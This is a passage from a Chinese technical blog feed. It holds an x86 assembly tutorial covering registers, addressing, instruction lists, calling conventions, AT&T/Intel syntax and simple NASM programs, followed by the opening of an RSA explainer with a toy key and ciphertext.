Flag)<br>中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。具体规定如下：<br>(1)当IF=1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求；<br>(2)当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。<br>CPU的指令系统中也有专门的指令来改变标志位IF的值。<br>3、方向标志DF(Direction Flag)<br>方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。具体规定在第5.2.11节——字符串操作指令——中给出。在微机的指令系统中，还提供了专门的指令来改变标志位DF的值。</p><h4 id="32位标志寄存器增加的标志位"><a href="#32位标志寄存器增加的标志位" class="headerlink" title="32位标志寄存器增加的标志位"></a>32位标志寄存器增加的标志位</h4><p>1、I/O特权标志IOPL(I/O Privilege Level)<br>    I/O特权标志用两位二进制位来表示，也称为I/O特权级字段。该字段指定了要求执行I/O指令的特权级。如果当前的特权级别在数值上小于等于IOPL的值，那么，该I/O指令可执行，否则将发生一个保护异常<br>2、嵌套任务标志NT(Nested Task)<br>嵌套任务标志NT用来控制中断返回指令IRET的执行。具体规定如下：<br>(1)当NT=0，用堆栈中保存的值恢复EFLAGS、CS和EIP，执行常规的中断返回操作；<br>(2)当NT=1，通过任务转换实现中断返回。<br>3、重启动标志RF(Restart Flag)<br>重启动标志RF用来控制是否接受调试故障。规定：RF=0时，表示“接受”调试故障，否则拒绝之。在成功执行完一条指令后，处理机把RF置为0，当接受到一个非调试故障时，处理机就把它置为1。<br>4、虚拟8086方式标志VM(Virtual 8086 Mode)<br>如果该标志的值为1，则表示处理机处于虚拟的8086方式下的工作状态，否则，处理机处于一般保护方式下的工作状态</p><h1 id="内存和寻址模式"><a href="#内存和寻址模式" class="headerlink" title="内存和寻址模式"></a>内存和寻址模式</h1><h2 id="声明静态数据区"><a href="#声明静态数据区" class="headerlink" title="声明静态数据区"></a>声明静态数据区</h2><p>可以在X86汇编语言中用汇编指令.DATA声明静态数据区（类似于全局变量），数据以单字节、双字节、或双字（4字节）的方式存放，分别用DB,DW, DD指令表示声明内存的长度。在汇编语言中，相邻定义的标签在内存中是连续存放的。</p><pre><code>.DATA               var        DB 64      ;声明一个字节，并将数值64放入此字节中var2    DB ?    ; 声明一个为初始化的字节.         DB 10    ; 声明一个没有label的字节，其值为10.X        DW ?    ; 声明一个双字节，未初始化.Y        DD 30000; 声明一个4字节，其值为30000.</code></pre><p>还可以声明连续的数据和数组，声明数组时使用DUP关键字</p><pre><code>Z       DD 1, 2, 3    ; Declare three 4-byte values, initialized to 1, 2, and 3. The value of location Z + 8 will be 3.bytes  DB 10 DUP(?)    ; Declare 10 uninitialized bytes starting at location bytes.arr       DD 100 DUP(0); Declare 100 4-byte words starting at location arr, all initialized to 0str       DB &#39;hello&#39;,0    ; Declare 6 bytes starting at the address str, initialized to the ASCII character values for hello and the null (0) byte.</code></pre><h2 id="寻址模式"><a href="#寻址模式" class="headerlink" title="寻址模式"></a>寻址模式</h2><p>现代X86处理器具有232字节的寻址空间。在上面的例子中，我们用标签(label)表示内存区域，这些标签在实际汇编时，均被32位的实际地址代替。除了支持这种直接的内存区域描述，X86还提供了一种灵活的内存寻址方式，即利用最多两个32位的寄存器和一个32位的有符号常数相加计算一个内存地址，其中一个寄存器可以左移1、2或3位以表述更大的空间。下面例子是汇编程序中常见的方式</p><pre><code>mov eax, [ebx]        ; 将ebx值指示的内存地址中的4个字节传送到eax中mov [var], ebx        ; 将ebx的内容传送到var的值指示的内存地址中.mov eax, [esi-4]    ; 将esi-4值指示的内存地址中的4个字节传送到eax中mov [esi+eax], cl    ; 将cl的值传送到esi+eax的值指示的内存地址中mov edx, [esi+4*ebx]; 将esi+4*ebx值指示的内存中的4个字节传送到edx</code></pre><p>下面是违反规则的例子:</p><pre><code>mov eax, [ebx-ecx]       ; 只能用加法mov [eax+esi+edi], ebx ; 最多只能有两个寄存器参与运算</code></pre><h2 id="长度规定"><a href="#长度规定" class="headerlink" title="长度规定"></a>长度规定</h2><p>在声明内存大小时，在汇编语言中，一般用DB，DW，DD均可声明的内存空间大小，这种现实声明能够很好地指导汇编器分配内存空间，但是，对于</p><p>mov [ebx], 2</p><p>如果没有特殊的标识，则不确定常数2是单字节、双字节，还是双字。对于这种情况，X86提供了三个指示规则标记，分别为BYTE PTR, WORD PTR, and DWORD PTR，如上面例子写成：mov BYTE PTR [ebx], 2， mov WORD PTR [ebx], 2， mov DWORD PTR [ebx], 2，则意思非常清晰。</p><h1 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h1><h2 id="数据传输指令"><a href="#数据传输指令" class="headerlink" title="数据传输指令"></a>数据传输指令</h2><p>它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据<br>1.输入输出端口传送指令.</p><pre><code>IN    I/O端口输入( 语法: IN 累加器, {端口号│DX} ) OUT   I/O端口输出(语法: OUT {端口号│DX},累加器 )</code></pre><p>输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时, 其范围是 0-65535.</p><p>2.通用数据传送指令</p><pre><code>MOV    传送字或字节        MOVSX  先符号扩展,再传送          MOVZX  先零扩展,再传送  PUSH   把字压入堆栈       POP    把字弹出堆栈      PUSHA  把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈  POPA   把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈  PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈 POPAD  把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈 BSWAP  交换32位寄存器里字节的顺序  XCHG   交换字或字节( 至少有一个操作数为寄存器,段寄存器不可作为操作数)  CMPXCHG比较并交换操作数( 第二个操作数必须为累加器AL/AX/EAX )  XADD   先交换再累加( 结果在第一个操作数里 )  XLAT   字节查表转换  ── BX 指向一张 256 字节的表的起点, AL 为表的索引值 (0-255,即0-FFH); 返回 AL 为查表结果. ( [BX+AL]-&gt;AL )</code></pre><p>3.目的地址传送指令 </p><pre><code>LEA   装入有效地址.                例: LEA DX,string  ;把偏移地址存到DX.  LDS   传送目标指针,把指针内容装入DS   例: LDS SI,string  ;把段地址:偏移地址存到DS:SI LES   传送目标指针,把指针内容装入ES   例: LES DI,string  ;把段地址:偏移地址存到ES:DI  LFS   传送目标指针,把指针内容装入FS   例: LFS DI,string  ;把段地址:偏移地址存到FS:DI LGS   传送目标指针,把指针内容装入GS   例: LGS DI,string  ;把段地址:偏移地址存到GS:DI  LSS   传送目标指针,把指针内容装入SS   例: LSS DI,string  ;把段地址:偏移地址存到SS:DI</code></pre><p>4.标志传送指令 </p><pre><code>LAHF    标志寄存器传送,把标志装入AH SAHF    标志寄存器传送,把AH内容装入标志寄存器 PUSHF   标志入栈 POPF    标志出栈 PUSHD   32位标志入栈  POPD    32位标志出栈.</code></pre><h2 id="算数运算指令"><a href="#算数运算指令" class="headerlink" title="算数运算指令"></a>算数运算指令</h2><pre><code>ADD     加法                                  ADC     带进位加法                                INC     加 1      AAA     加法的ASCII码调整            DAA     加法的十进制调整.  SUB     减法    SBB     带借位减法      DEC     减 1NEC     求反(以 0 减之)                 CMP     比较(两操作数作减法,仅修改标志位,不回送结果).  AAS     减法的ASCII码调整            DAS     减法的十进制调整.  MUL     无符号乘法     IMUL    整数乘法   以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算),  AAM     乘法的ASCII码调整      DIV     无符号除法                        IDIV    整数除法以上两条,结果回送:商回送AL,余数回送AH, (字节运算);或商回送AX,余数回送DX, (字运算).  AAD    除法的ASCII码调整.  CBW    字节转换为字(把AL中字节的符号扩展到AH中去)  CWD    字转换为双字(把AX中的字的符号扩展到DX中去)  CWDE   字转换为双字(把AX中的字符号扩展到EAX中去)  CDQ    双字扩展(把EAX中的字的符号扩展到EDX中去)</code></pre><h2 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h2><pre><code>AND  与运算                OR   或运算               XOR  异或运算                 NOT  取反TEST 测试(两操作数作与运算,仅修改标志位,不回送结果).  SHL  逻辑左移                         SHR  逻辑右移SAL  算术左移(=SHL)               SAR  算术右移(=SHR) ROL  循环左移                        ROR  循环右移  RCL  通过进位的循环左移       RCR  通过进位的循环右移 以上八种移位指令,其移位次数可达255次 移位一次时, 可直接用操作码.  如 SHL AX,1 移位&gt;1次时, 则由寄存器CL给出移位次数  如  MOV CL,04      SHL AX,CL</code></pre><h2 id="串指令"><a href="#串指令" class="headerlink" title="串指令"></a>串指令</h2><pre><code>DS:SI  源串段寄存器:源串变址                    ES:DI  目标串段寄存器:目标串变址. CX     重复次数计数器                  AL/AX  扫描值  D标志   0表示重复操作中SI和DI应自动增量; 1表示应自动减量  Z标志   用来控制扫描或比较操作的结束  MOVS   串传送 (MOVSB 传送字符 MOVSW 传送字 MOVSD 传送双字 )  CMPS   串比较 (CMPSB 比较字符  CMPSW 比较字 )  SCAS   串扫描，把AL或AX的内容与目标串作比较,比较结果反映在标志位  LODS   装入串，把源串中的元素(字或字节)逐一装入AL或AX中. (LODSB  传送字符   LODSW 传送字      LODSD 传送双字)  STOS   保存串，是LODS的逆过程  REP    当CX/ECX&lt;&gt;0时重复 REPE/REPZ    当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复  REPNE/REPNZ  当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复  REPC         当CF=1且CX/ECX&lt;&gt;0时重复  REPNC        当CF=0且CX/ECX&lt;&gt;0时重复</code></pre><h2 id="程序转移指令"><a href="#程序转移指令" class="headerlink" title="程序转移指令"></a>程序转移指令</h2><h3 id="无条件转移指令-长转移"><a href="#无条件转移指令-长转移" class="headerlink" title="无条件转移指令 (长转移)"></a>无条件转移指令 (长转移)</h3><pre><code>JMP     无条件转移指         CALL    过程调用            RET/RETF过程返回</code></pre><p>call, ret— Subroutine call and return<br>这两条指令实现子程序（过程、函数等意思）的调用及返回。call指令首先将当前执行指令地址入栈，然后无条件转移到由标签指示的指令。与其它简单的跳转指令不同，call指令保存调用之前的地址信息（当call指令结束后，返回到调用之前的地址）。<br>ret指令实现子程序的返回机制，ret指令弹出栈中保存的指令地址，然后无条件转移到保存的指令地址执行。call，ret是函数调用中最关键的两条指令。<br>调用规则<br>为了加强程序员之间的协作及简化程序开发进程，设定一个函数调用规则非常必要，函数调用规则规定函数调用及返回的规则，只要遵照这种规则写的程序均可以正确执行，从而程序员不必关心诸如参数如何传递等问题；另一方面，在汇编语言中可以调用符合这种规则的高级语言所写的函数，从而将汇编语言程序与高级语言程序有机结合在一起。<br>调用规则分为两个方面，及调用者规则和被调用者规则，如一个函数A调用一个函数B，则A被称为调用者(Caller)，B被称为被调用者(Callee)。<br>下图显示一个调用过程中的内存中的栈布局：</p><p><img src="/images/stack-convention.png" alt=""></p><p>在X86中，栈增长方向与内存编号增长方向相反。<br>Caller Rules</p><p>调用者规则包括一系列操作，描述如下：<br>1.在调用子程序之前，调用者应该保存一系列被设计为调用者保存的寄存器的值。调用者保存寄存器有eax，ecx，edx。由于被调用的子程序会修改这些寄存器，所以为了在调用子程序完成之后能正确执行，调用者必须在调用子程序之前将这些寄存器的值入栈。<br>2.在调用子程序之前，将参数入栈。参数入栈的顺序应该是从最后一个参数开始，如上图中parameter3先入栈。<br>3.利用call指令调用子程序。这条指令将返回地址放置在参数的上面，并进入子程序的指令执行。（子程序的执行将按照被调用者的规则执行）</p><p>当子程序返回时，调用者期望找到子程序保存在eax中的返回地址。为了恢复调用子程序执行之前的状态，调用者应该执行以下操作：<br>1.清除栈中的参数；<br>2.将栈中保存的eax值、ecx值以及edx值出栈，恢复eax、ecx、edx的值（当然，如果其它寄存器在调用之前需要保存，也需要完成类似入栈和出栈操作）</p><p>Example </p><p>如下代码展示了一个调用子程序的调用者应该执行的操作。此汇编程序调用一个具有三个参数的函数_myFunc，其中第一个参数为eax，第二个参数为常数216，第三个参数为var指示的内存中的值。</p><pre><code>push [var]   ; Push last parameter firstpush 216     ; Push the second parameterpush eax     ; Push first parameter lastcall _myFunc ; Call the function (assume C naming)add esp, 12</code></pre><p>在调用返回时，调用者必须清除栈中的相应内容，在上例中，参数占有12个字节，为了消除这些参数，只需将ESP加12即可。</p><p> _myFunc的值保存在eax中，ecx和edx中的值也许已经被改变，调用者还必须在调用之前保存在栈中，并在调用结束之后，出栈恢复ecx和edx的值。</p><p>被调用者应该遵循如下规则：<br>1.将ebp入栈，并将esp中的值拷贝到ebp中，其汇编代码如下：</p><pre><code>push ebpmov  ebp, esp</code></pre><p>上述代码的目的是保存调用子程序之前的基址指针，基址指针用于寻找栈上的参数和局部变量。当一个子程序开始执行时，基址指针保存栈指针指示子程序的执行。为了在子程序完成之后调用者能正确定位调用者的参数和局部变量，ebp的值需要返回。<br>2.在栈上为局部变量分配空间。<br>3.保存callee-saved寄存器的值，callee-saved寄存器包括ebx,edi和esi，将ebx,edi和esi压栈。<br>4.在上述三个步骤完成之后，子程序开始执行，当子程序返回时，必须完成如下工作：<br>(1)将返回的执行结果保存在eax中<br>(2)弹出栈中保存的callee-saved寄存器值，恢复callee-saved寄存器的值（ESI和EDI）<br>(3)收回局部变量的内存空间。实际处理时，通过改变EBP的值即可：mov esp, ebp。<br>(4)通过弹出栈中保存的ebp值恢复调用者的基址寄存器值。<br>(5)执行ret指令返回到调用者程序。</p><p>Example</p><pre><code>.486.MODEL FLAT.CODEPUBLIC _myFunc_myFunc PROC  ; Subroutine Prologue  push ebp     ; Save the old base pointer value.  mov ebp, esp ; Set the new base pointer value.  sub esp, 4   ; Make room for one 4-byte local variable.  push edi     ; Save the values of registers that the function  push esi     ; will modify. This function uses EDI and ESI.  ; (no need to save EBX, EBP, or ESP)  ; Subroutine Body  mov eax, [ebp+8]   ; Move value of parameter 1 into EAX  mov esi, [ebp+12]  ; Move value of parameter 2 into ESI  mov edi, [ebp+16]  ; Move value of parameter 3 into EDI  mov [ebp-4], edi   ; Move EDI into the local variable  add [ebp-4], esi   ; Add ESI into the local variable  add eax, [ebp-4]   ; Add the contents of the local variable                     ; into EAX (final result)  ; Subroutine Epilogue   pop esi      ; Recover register values  pop  edi  mov esp, ebp ; Deallocate local variables  pop ebp ; Restore the caller&#39;s base pointer value  ret_myFunc ENDPEND</code></pre><p>子程序首先通过入栈的手段保存ebp，分配局部变量，保存寄存器的值。</p><p>在子程序体中，参数和局部变量均是通过ebp进行计算。由于参数传递在子程序被调用之前，所以参数总是在ebp指示的地址的下方（在栈中），因此，上例中的第一个参数的地址是ebp+8，第二个参数的地址是ebp+12，第三个参数的地址是ebp+16；而局部变量在ebp指示的地址的上方，所有第一个局部变量的地址是ebp-4，而第二个这是ebp-8.</p><h3 id="条件转移指令"><a href="#条件转移指令" class="headerlink" title="条件转移指令"></a>条件转移指令</h3><p>(短转移,-128到+127的距离内)  ( 当且仅当(SF XOR OF)=1时,OP1&lt;OP2 )</p><pre><code>JA/JNBE  不小于或不等于时转移        JAE/JNB  大于或等于转移JB/JNAE  小于转移                             JBE/JNA  小于或等于转移 以上四条,测试无符号整数运算的结果(标志C和Z)  JG/JNLE  大于转移                              JGE/JNL  大于或等于转移  JL/JNGE  小于转移                              JLE/JNG  小于或等于转移  以上四条,测试带符号整数运算的结果(标志S,O和Z)  JE/JZ    等于转移                                  JNE/JNZ  不等于时转移  JC       有进位时转移                               JNC      无进位时转移  JNO      不溢出时转移                             JO       溢出转移  JNP/JPO  奇偶性为奇数时转移           JP/JPE   奇偶性为偶数时转移  JNS      符号位为 “0” 时转移                  JS       符号位为 &quot;1&quot; 时转移</code></pre><h3 id="循环控制指令-短转移"><a href="#循环控制指令-短转移" class="headerlink" title="循环控制指令(短转移)"></a>循环控制指令(短转移)</h3><pre><code>LOOP           CX不为零时循环              LOOPE/LOOPZ    CX不为零且标志Z=1时循环LOOPNE/LOOPNZ  CX不为零且标志Z=0时循环 JCXZ           CX为零时转移                JECXZ          ECX为零时转移</code></pre><h3 id="中断指令"><a href="#中断指令" class="headerlink" title="中断指令"></a>中断指令</h3><pre><code>INT     中断指令                NTO     溢出中断             IRET     中断返回</code></pre><h3 id="处理器控制指令"><a href="#处理器控制指令" class="headerlink" title="处理器控制指令"></a>处理器控制指令</h3><pre><code>HLT   处理器暂停, 直到出现中断或复位信号才继续WAIT  当芯片引线TEST为高电平时使CPU进入等待状态  ESC   转换到外处理器     LOCK  封锁总线            NOP   空操作  STC   置进位标志位      STD   置方向标志位        STI   置中断允许位CMC   进位标志取反CLC   清进位标志位       CLD   清方向标志位        CLI   清中断允许位</code></pre><h2 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h2><pre><code>DB            定义字节  DW            定义字(2字节)  PROC          定义过程  ENDP          过程结束  SEGMENT       定义段  ASSUME        建立段寄存器寻址 ENDS          段结束  END           程序结束</code></pre><h1 id="汇编语法格式"><a href="#汇编语法格式" class="headerlink" title="汇编语法格式"></a>汇编语法格式</h1><p>1.在 AT&amp;T 汇编格式中，寄存器名要加上 ‘%’ 作为前缀；而在 Intel 汇编格式中，寄存器名不需要加前缀。例如：</p><pre><code>AT&amp;T 格式            Intel 格式pushl %eax            push eax</code></pre><p>2.在 AT&amp;T 汇编格式中，用 ‘$’ 前缀表示一个立即操作数；而在 Intel 汇编格式中，立即数的表示不用带任何前缀。例如：</p><pre><code>AT&amp;T 格式            Intel 格式pushl $1            push 1</code></pre><p>3.AT&amp;T 和 Intel 格式中的源操作数和目标操作数的位置正好相反。在 Intel 汇编格式中，目标操作数在源操作数的左边；而在 AT&amp;T 汇编格式中，目标操作数在源操作数的右边。例如：</p><pre><code>AT&amp;T 格式            Intel 格式addl $1, %eax            add eax, 1</code></pre><p>4.在 AT&amp;T 汇编格式中，操作数的字长由操作符的最后一个字母决定，后缀’b’、’w’、’l’分别表示操作数为字节（byte，8 比特）、字（word，16 比特）和长字（long，32比特）；而在 Intel 汇编格式中，操作数的字长是用 “byte ptr” 和 “word ptr” 等前缀来表示的。例如：</p><pre><code>AT&amp;T 格式            Intel 格式movb val, %al            mov al, byte ptr val</code></pre><p>5.在 AT&amp;T 汇编格式中，绝对转移和调用指令（jump/call）的操作数前要加上’*’作为前缀，而在 Intel 格式中则不需要。</p><p>6.远程转移指令和远程子调用指令的操作码，在 AT&amp;T 汇编格式中为 “ljump” 和 “lcall”，而在 Intel 汇编格式中则为 “jmp far” 和 “call far”，即：</p><pre><code>AT&amp;T 格式                          Intel 格式ljump $section, $offset                  jmp far section:offsetlcall $section, $offset                  call far section:offset</code></pre><p>与之相应的远程返回指令则为：</p><pre><code>AT&amp;T 格式                          Intel 格式lret $stack_adjust                  ret far stack_adjust</code></pre><p>7.在 AT&amp;T 汇编格式中，内存操作数的寻址方式是</p><pre><code>section:disp(base, index, scale)</code></pre><p>而在 Intel 汇编格式中，内存操作数的寻址方式为：</p><pre><code>section:[base + index*scale + disp]</code></pre><p>由于 Linux 工作在保护模式下，用的是 32 位线性地址，所以在计算地址时不用考虑段基址和偏移量，而是采用如下的地址计算方法：</p><pre><code>disp + base + index * scale</code></pre><p>下面是一些内存操作数的例子：</p><pre><code>AT&amp;T 格式                            Intel 格式movl -4(%ebp), %eax             mov eax, [ebp - 4]movl array(, %eax, 4), %eax        mov eax, [eax*4 + array]movw array(%ebx, %eax, 4), %cx        mov cx, [ebx + 4*eax + array]movb $4, %fs:(%eax)                 mov fs:eax, 4</code></pre><h1 id="64位和32位的寄存器和汇编的比较"><a href="#64位和32位的寄存器和汇编的比较" class="headerlink" title="64位和32位的寄存器和汇编的比较"></a>64位和32位的寄存器和汇编的比较</h1><p><img src="/images/14955328458588.jpg" alt=""></p><p>X64多了8个通用寄存器：R8、R9、R10、R11、R12、R13、R14、R15，当然，它们都是64位的。另外还增加了8个128位XMM寄存器，不过通常用不着。<br>    X32中原有的寄存器在X64中均为扩展为64位，且名称的第一个字母从E改为R。不过我们还是可以在64位程序中调用32位的寄存器，如RAX（64位）、EAX（低32）、AX（低16位）、AL（低8位）、AH（8到15位），相应的有R8、R8D、R8W和R8B。不过不要在程序中使用如AH之类的寄存器，因为在AMD的CPU上这种用法会与某些指令产生冲突</p><h2 id="64位寄存器分配的不同"><a href="#64位寄存器分配的不同" class="headerlink" title="64位寄存器分配的不同:"></a>64位寄存器分配的不同:</h2><p><img src="/images/14955328749738.jpg" alt=""></p><p>64位有16个寄存器，32位只有8个。但是32位前8个都有不同的命名，分别是e <em> ，而64位前8个使用了r代替e，也就是r </em>。e开头的寄存器命名依然可以直接运用于相应寄存器的低32位。而剩下的寄存器名则是从r8 - r15，其低位分别用d，w,b指定长度。<br>32位使用栈帧来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。rax作为返回值<br>64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用<br>64位支持一些形式的以PC相关的寻址，而32位只有在jmp的时候才会用到这种寻址方式。</p><p><img src="/images/20160428235309742.png" alt=""></p><p>mov指令和push pop扩展了movq系列的mov和pushq以及popq用来操作quad word。<br>注：movabsq不是32位的扩展，是纯新增的指令。用来将一个64位的字面值直接存到一个64位寄存器中。因为movq只能将32位的值存入，所以新增了这样一条指令。</p><p><img src="/images/14955327305103.jpg" alt=""></p><h2 id="过程（函数）调用的不同"><a href="#过程（函数）调用的不同" class="headerlink" title="过程（函数）调用的不同"></a>过程（函数）调用的不同</h2><p>参数通过寄存器传递（见前文）<br>callq 在栈里存放一个8位的返回地址<br>许多函数不再有栈帧，只有无法将所有本地变量放在寄存器里的才会在栈上分配空间。<br>函数可以获取到栈至多128字节的空间。这样函数就可以在不更改栈指针的情况下在栈上存储信息（也就是说，可以提前用rsp以下的128字节空间，这段空间被称为red zone，在x86-64里，时刻可用）<br>不再有栈帧指针。现在栈的位置和栈指针相关。大多数函数在调用的一开始就分配全部所需栈空间，之后保持栈指针不改变。<br>一些寄存器被设计成为被调用者-存储的寄存器。这些必须在需要改变他们值的时候存储他们并且之后恢复他们。</p><h2 id="参数传递的不同"><a href="#参数传递的不同" class="headerlink" title="参数传递的不同"></a>参数传递的不同</h2><p>6个寄存器用来传递参数<br>剩下的寄存器按照之前的方式传递（不过是与rsp相关了，ebp不再作为栈帧指针，并且从rsp开始第7个参数，rsp+8开始第8个，以此类推）<br>调用时，rsp向下移动8位（存入返回地址），寄存器参数无影响，第7个及之后的参数现在则是从rsp+8开始第7个，rsp+16开始第8个，以此类推</p><h2 id="栈帧的不同"><a href="#栈帧的不同" class="headerlink" title="栈帧的不同"></a>栈帧的不同</h2><p>很多情况下不再需要栈帧，比如在没有调用别的函数，且寄存器足以存储参数，那么就只需要存储返回地址即可。 需要栈帧的情况：</p><pre><code>本地变量太多，寄存器不够一些本地变量是数组或结构体函数使用了取地址操作符来计算一个本地变量的地址函数必须用栈传送一些参数给另外一个函数函数需要保存一些由被调用者存储的寄存器的状态（以便于恢复）</code></pre><p>但是现在的栈帧经常是固定大小的，在函数调用的最开始就被设定，在整个调用期间，栈顶指针保持不变，这样就可以通过对其再加上偏移量来对相应的值进行操作，于是EBP就不再需要作为栈帧指针了。</p><p>虽然很多时候我们认为没有“栈帧”，但是每次函数调用都一定有一个返回地址被压栈，我们可以也认为这一个地址就是一个“栈帧”，因为它也保存了调用者的状态。</p><h1 id="基本汇编程序"><a href="#基本汇编程序" class="headerlink" title="基本汇编程序"></a>基本汇编程序</h1><p>1.Hello, world!</p><p>32位</p><pre><code>section .data                    msg db &quot;Hello, world!&quot;, 0xA            len equ $ - msg                 section .text            global main           main:                          mov edx, len             mov ecx, msg            mov ebx, 1               mov eax, 4                int 0x80                mov ebx, 0               mov eax, 1               int 0x80</code></pre><pre><code>righteous@ubuntu:~/Desktop/asm$ nasm -f elf32 hello.asmrighteous@ubuntu:~/Desktop/asm$ gcc -m32 -o hello hello.orighteous@ubuntu:~/Desktop/asm$ ./helloHello, world!</code></pre><p>64位</p><pre><code>extern    printf        section .data            msg:    db &quot;Hello world&quot;, 0        fmt:    db &quot;%s&quot;, 10, 0        section .text       global  main    main:                        push    rbp            mov    rdi,fmt    mov    rsi,msg    mov    rax,0                call    printf            pop    rbp            mov    rax,0            ret</code></pre><pre><code>righteous@ubuntu:~/Desktop/asm$ nasm -f elf64 hello_x64.asm righteous@ubuntu:~/Desktop/asm$ gcc -m64 -o hello_x64 hello_x64.orighteous@ubuntu:~/Desktop/asm$ ./hello_x64 Hello world</code></pre><p>2.求和</p><pre><code>extern    printfsection .data            a:  dd  5        b:  dd  7fmt:    db &quot;sum:c=a+b=%d&quot;, 10, 0 section .bss        c:  resd 1  section .text                  global  main        main:                        push    ebp                mov     ebp,esp    mov    eax, [a]        add    eax, [b]        mov    [c], eax        push    eax                push    dword [c]            push    dword fmt            call    printf                add     esp, 12                mov     esp, ebp            pop     ebp            mov    eax,0            ret</code></pre><pre><code>righteous@ubuntu:~/Desktop/asm$ nasm -f elf32 sum.asmrighteous@ubuntu:~/Desktop/asm$ gcc -m32 -o sum sum.orighteous@ubuntu:~/Desktop/asm$ ./sumsum:c=a+b=12</code></pre><p>3.斐波那契数列</p><pre><code>extern  printfsection .dataformat:  db  &quot;SDPC==&gt;%ld&quot;, 10, 0section .textglobal  mainmain:        push    rbx                             mov     ecx, 10                         xor     rax, rax                       xor     rbx, rbx                       inc     rbx Fibonacci:        push    rax                             push    rcx                             mov     rdi, format                     mov     rsi, rax                        xor     rax, rax                         call    printf                        pop     rcx                           pop     rax                            mov     rdx, rax                     mov     rax, rbx                      add     rbx, rdx                    dec     ecx                jnz     Fibonacci               pop     rbx                          ret</code></pre><pre><code>righteous@ubuntu:~/Desktop/asm$ gcc -m64 -o fibonacci fibonacci.orighteous@ubuntu:~/Desktop/asm$ nasm -f elf64 fibonacci.asm righteous@ubuntu:~/Desktop/asm$ gcc -m64 -o fibonacci fibonacci.orighteous@ubuntu:~/Desktop/asm$ ./fibonacci SDPC==&gt;0SDPC==&gt;1SDPC==&gt;1SDPC==&gt;2SDPC==&gt;3SDPC==&gt;5SDPC==&gt;8SDPC==&gt;13SDPC==&gt;21SDPC==&gt;34</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;汇编&quot;&gt;&lt;a href=&quot;#汇编&quot; class=&quot;headerlink&quot; title=&quot;汇编&quot;&gt;&lt;/a&gt;汇编&lt;/h1&gt;&lt;p&gt;汇编语言（assembly language）是一种用于电子计算机、微处理器、微控制器或其他可编程器件的低级语言，亦称为符号语言。在汇编语言中，用助记符（Mnemonics）代替机器指令的操作码，用地址符号（Symbol）或标号（Label）代替指令或操作数的地址。在不同的设备中，汇编语言对应着不同的机器语言指令集，通过汇编过程转换成机器指令。普遍地说，特定的汇编语言和特定的机器语言指令集是一一对应的,不同平台之间不可直接移植。&lt;br&gt;
    
    </summary>
    
      <category term="Foundation" scheme="http://righte0us.cc/categories/Foundation/"/>
    
    
      <category term="Foundation" scheme="http://righte0us.cc/tags/Foundation/"/>
    
  </entry>
  
  <entry>
    <title>RSA</title>
    <link href="http://righte0us.cc/2017/01/02/RSA/"/>
    <id>http://righte0us.cc/2017/01/02/RSA/</id>
    <published>2017-01-02T02:23:42.000Z</published>
    <updated>2017-06-04T05:30:02.276Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（AdiShamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年首次公布，当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。<br>RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准。<br>RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。<br>RSA的安全性依赖于大数分解，但是否等同于大数分解一直未能得到理论上的证明，因为没有证明破解RSA就一定需要作大数分解。假设存在一种无须分解大数的算法，那它肯定可以修改成为大数分解算法。 RSA 的一些变种算法已被证明等价于大数分解。不管怎样，分解n是最显然的攻击方法。人们已能分解多个十进制位的大素数。因此，模数n必须选大一些，因具体适用情况而定。</p><a id="more"></a><h2 id="数论知识"><a href="#数论知识" class="headerlink" title="数论知识"></a>数论知识</h2><ul><li>互质关系</li><li>欧拉函数</li><li>欧拉定理</li><li>欧拉准则</li><li>中国剩余定理</li><li>模反元素</li></ul><h2 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h2><p>1.随机选择两个不相等的质数p,q<br>2.计算p和q的乘积n<br>3.计算n的欧拉函数φ(n)=(p-1)(q-1)<br>4.随机选择一个整数e,条件是1&lt;e&lt;φ(n),且e与φ(n)互质<br>5.计算e与φ(n)的模反元素d<br>6.将n与e封装成公钥(n,e)，将n与d封装成私钥(n,d)</p><h2 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h2><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>用公钥(n,e),对m进行加密，得到密文c</p><p> c ≡ me mod n</p><pre><code>例：已知公钥(920139713,19),对明文m加密后得到密文c=[704796792,752211152,274704164,18414022,368270835,483295235,263072905,459788476,483295235,459788476,663551792,475206804,459788476,428313374,475206804,459788476,425392137,704796792,458265677,341524652,483295235,534149509,425392137,428313374,425392137,341524652,458265677,263072905,483295235,828509797,341524652,425392137,475206804,428313374,483295235,475206804,459788476,306220148]</code></pre><h3 id="解密"><a href="#解密" class="headerlink" 